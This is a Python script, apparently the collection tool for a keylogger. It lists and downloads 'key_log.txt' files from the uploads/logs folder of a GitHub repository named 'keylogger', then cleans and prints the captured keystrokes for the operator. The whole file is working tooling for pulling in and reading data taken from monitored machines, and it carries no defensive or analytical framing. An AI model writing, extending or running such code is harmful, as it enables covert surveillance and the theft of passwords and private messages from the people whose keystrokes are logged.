import os
import requests
import re

# Function to clean text
def clean_text(input_text):
    # Regular expression to match words enclosed in square brackets
    pattern = r'\[[^\]]+\]'
    
    # Remove all occurrences of text within square brackets
    cleaned_text = re.sub(pattern, '', input_text)
    
    # Strip extra spaces that may have been left after removing bracketed text
    cleaned_text = re.sub(r'\s+', ' ', cleaned_text).strip()
    
    return cleaned_text

# Function to split text at the stopping pattern
def split_at_stopping_pattern(text):
    # Define the stopping pattern regex
    stopping_pattern = r"^={80}\n\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} - Previous Data 👇\n={80}$"
    
    # Split the text into lines
    lines = text.splitlines()
    
    # Iterate through the lines to find the stopping pattern
    for idx in range(len(lines) - 2):  # Ensure there are enough lines to check
        # Combine three consecutive lines to check for the stopping pattern
        combined_lines = "\n".join(lines[idx:idx + 3])
        if re.fullmatch(stopping_pattern, combined_lines):
            # Truncate the text up to the line before the stopping pattern
            return "\n".join(lines[:idx]).strip()
    
    # If no stopping pattern is found, return the entire text
    return text.strip()

# GitHub API details
GITHUB_API_URL = "https://api.github.com"
REPO_OWNER = "bebedudu"
REPO_NAME = "keylogger"
DIRECTORY_PATH = "uploads/logs"
GITHUB_TOKEN = "add_your_token_here"  # Replace with your GitHub API token

# Headers for authentication
headers = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

# Fetch files from the GitHub repository directory
def fetch_files_from_github():
    url = f"{GITHUB_API_URL}/repos/{REPO_OWNER}/{REPO_NAME}/contents/{DIRECTORY_PATH}"
    response = requests.get(url, headers=headers)
    
    if response.status_code != 200:
        print(f"Error fetching files: {response.status_code} - {response.text}")
        return []
    
    files = response.json()
    # Filter files ending with "key_log.txt"
    filtered_files = [file for file in files if file["name"].endswith("key_log.txt")]
    return filtered_files

# Display files and let the user select one
def select_file(files):
    print("Available files:")
    for idx, file in enumerate(files):
        print(f"{idx + 1}. {file['name']}")
    
    while True:
        try:
            choice = int(input("Select a file by number: "))
            if 1 <= choice <= len(files):
                return files[choice - 1]
            else:
                print("Invalid choice. Please select a valid number.")
        except ValueError:
            print("Please enter a valid number.")

# Fetch content of the selected file
def fetch_file_content(file):
    download_url = file["download_url"]
    response = requests.get(download_url, headers=headers)
    
    if response.status_code != 200:
        print(f"Error fetching file content: {response.status_code} - {response.text}")
        return None
    
    return response.text

# Main function
def main():
    # Step 1: Fetch files from GitHub
    files = fetch_files_from_github()
    if not files:
        print("No files found or an error occurred.")
        return
    
    # Step 2: Let the user select a file
    selected_file = select_file(files)
    print(f"You selected: {selected_file['name']}")
    
    # Step 3: Fetch the content of the selected file
    file_content = fetch_file_content(selected_file)
    if file_content is None:
        print("Failed to fetch file content.")
        return
    
    # Step 4: Stop processing at the stopping pattern
    truncated_content = split_at_stopping_pattern(file_content)
    
    # Step 5: Clean the text content
    cleaned_content = clean_text(truncated_content)
    
    # Step 6: Display the cleaned content
    print("\nCleaned Content:")
    print(cleaned_content)

if __name__ == "__main__":
    main()